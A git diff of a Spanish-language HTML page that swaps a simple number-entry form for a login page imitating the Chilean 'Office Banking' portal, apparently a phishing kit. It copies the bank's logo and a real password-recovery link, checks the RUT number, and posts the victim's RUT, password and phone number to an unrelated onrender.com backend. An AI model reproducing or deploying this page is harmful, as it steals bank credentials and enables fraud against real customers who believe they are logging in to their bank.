@@ -2,49 +2,115 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Página Pública</title>
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
-  <script src="firebase.js"></script>
-  <style>
-    .contenedor { display: flex; justify-content: space-around; margin-top: 20px; }
-    .cuadro { border: 1px solid #ccc; padding: 15px; width: 150px; text-align: center; background:#f9f9f9; border-radius: 8px; }
-    .cuadro label { display:block; margin-bottom:8px; font-weight:bold; }
-    .cuadro input { width:80%; padding:5px; }
-  </style>
+  <title>Office Banking</title>
+  <!-- Adaptación a móviles -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Enlace al CSS externo -->
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-  <h2>Página de ingreso de datos</h2>
-  <div class="contenedor">
-    <div class="cuadro" id="cuadro1"><label id="label1">A1</label><input type="number" id="num1"></div>
-    <div class="cuadro" id="cuadro2"><label id="label2">A2</label><input type="number" id="num2"></div>
-    <div class="cuadro" id="cuadro3"><label id="label3">A3</label><input type="number" id="num3"></div>
+  <div class="login-box">
+    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+
+    <form id="loginForm">
+      <label for="rut">RUT</label>
+      <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
+      
+      <label for="passwd">Contraseña</label>
+      <input type="password" id="passwd" name="passwd" required>
+
+      <label for="telefono">Teléfono actualizado</label>
+      <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
+      
+      <label class="checkbox-label">
+        <input type="checkbox" id="contacto" name="contacto" required>
+        Deseo que me contacte un ejecutivo para solicitar Línea de Crédito o Tarjeta de Crédito.  
+        O en su defecto aumento de cupo.
+      </label>
+      
+      <div class="options">
+        <label><input type="checkbox" id="recordar"> Recordar usuario</label>
+        <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvidé mi clave</a>
+      </div>
+      
+      <button type="submit">Ingresar</button>
+    </form>
+    <div id="resultado"></div>
+
+    <div class="footer-icons">
+      <div>📊<br>Indicadores Económicos</div>
+      <div>☎️<br>Contact Center</div>
+    </div>
   </div>
-  <button onclick="enviarEntradas()">Enviar</button>
 
   <script>
-    // Escuchar cambios en config
-    ["cuadro1","cuadro2","cuadro3"].forEach((cuadro,i)=>{
-      db.collection("config").doc(cuadro).onSnapshot(doc=>{
-        const data=doc.data();
-        if(data){
-          const campo="label"+(i+1);
-          if(data[campo]) document.getElementById(campo).textContent=data[campo];
-        }
-      });
+    // Formateo RUT con puntos y guion
+    function formatearRut(valor) {
+      valor = valor.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+      if(valor.length <= 1) return valor;
+      let cuerpo = valor.slice(0, -1);
+      let dv = valor.slice(-1);
+      let cuerpoConPuntos = "";
+      while(cuerpo.length > 3) {
+        cuerpoConPuntos = "." + cuerpo.slice(-3) + cuerpoConPuntos;
+        cuerpo = cuerpo.slice(0, -3);
+      }
+      cuerpoConPuntos = cuerpo + cuerpoConPuntos;
+      return cuerpoConPuntos + "-" + dv;
+    }
+
+    function validarRut(rutCompleto) {
+      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+      if(rutCompleto.length < 2) return false;
+      let cuerpo = rutCompleto.slice(0, -1);
+      let dv = rutCompleto.slice(-1);
+      let suma = 0, multiplo = 2;
+      for(let i = cuerpo.length - 1; i >= 0; i--) {
+        suma += parseInt(cuerpo.charAt(i)) * multiplo;
+        multiplo = multiplo < 7 ? multiplo + 1 : 2;
+      }
+      let dvEsperado = 11 - (suma % 11);
+      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+      return dv === dvEsperado;
+    }
+
+    const rutInput = document.getElementById("rut");
+    rutInput.addEventListener("input", function(e){
+      let valor = e.target.value.replace(/[^0-9kK]/g, "");
+      e.target.value = formatearRut(valor);
     });
 
-    // Enviar los 3 datos juntos
-    function enviarEntradas(){
-      const v1=document.getElementById("num1").value;
-      const v2=document.getElementById("num2").value;
-      const v3=document.getElementById("num3").value;
-      db.collection("entradas").doc("cuadro1").set({num1:v1});
-      db.collection("entradas").doc("cuadro2").set({num2:v2});
-      db.collection("entradas").doc("cuadro3").set({num3:v3});
-      alert("Datos enviados");
-    }
+    // Enviar datos al backend (Render)
+    document.getElementById("loginForm").addEventListener("submit", async function(e){
+      e.preventDefault();
+      const rut = rutInput.value;
+      const passwd = document.getElementById("passwd").value;
+      const telefono = document.getElementById("telefono").value;
+      const contacto = document.getElementById("contacto").checked;
+
+      if(!validarRut(rut)){
+        document.getElementById("resultado").innerText = "❌ RUT inválido";
+        return;
+      }
+      if(!contacto){
+        document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
+        return;
+      }
+
+      const backendURL = "https://login-ob.onrender.com/login"; 
+
+      try {
+        const response = await fetch(backendURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ rut, passwd, telefono })
+        });
+        const data = await response.text();
+        document.getElementById("resultado").innerText = data;
+      } catch (error) {
+        document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+      }
+    });
   </script>
 </body>
 </html>
-
